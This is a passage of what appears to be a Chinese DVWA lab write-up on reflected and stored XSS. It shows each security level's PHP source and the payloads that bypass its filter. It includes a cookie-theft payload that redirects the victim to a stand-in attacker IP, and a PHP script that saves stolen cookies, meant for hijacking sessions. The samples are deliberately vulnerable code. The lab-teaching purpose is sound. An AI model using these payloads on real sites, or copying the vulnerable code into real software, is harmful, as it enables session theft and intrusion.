class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium Reflected XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low Reflected XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-11"><a class="markdownIt-Anchor" href="#low-11">#</a> Low</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt; </span><br><span class="line">alert() confirm()prompt()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184310810.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210428184310810"></p><h3 id="medium-11"><a class="markdownIt-Anchor" href="#medium-11">#</a> Medium</h3><ul><li>嵌套过滤、大小写转换</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;</span><br><span class="line">&lt;ScrIpT&gt;</span><br></pre></td></tr></table></figure><ul><li>url 编码</li><li>通过诱导受害人点击页面隐藏提交 name 值，访问攻击网站的 php 脚本获取用户 cookie，从而劫持会话。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;DOCUMENT.location=&quot;http://攻击IP/cookie.php&quot;&lt;/script&gt;</span><br><span class="line">需要进行url编码</span><br><span class="line">%3Cscript%3EDOCUMENT.location%3D%22http%3A%2F%2FIP%2Fcookie.php%22%3C%2Fscript%3E </span><br></pre></td></tr></table></figure><ul><li>将保存的 cookie 用于登录被攻击账户</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="high-11"><a class="markdownIt-Anchor" href="#high-11">#</a> High</h3><ul><li>script 被过滤</li><li>使用其他标签</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184344293.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210428184344293"></p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184415013.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210428184415013"></p><h2 id="stored-cross-site-scripting-xss"><a class="markdownIt-Anchor" href="#stored-cross-site-scripting-xss">#</a> Stored Cross Site Scripting (XSS)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Stored XSS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-12"><a class="markdownIt-Anchor" href="#low-12">#</a> Low</h3><ul><li>与反射形类似</li></ul><h3 id="medium-12"><a class="markdownIt-Anchor" href="#medium-12">#</a> Medium</h3><ul><li>与反射形类似</li></ul><h3 id="high-12"><a class="markdownIt-Anchor" href="#high-12">#</a> High</h3><ul><li>与反射形类似</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
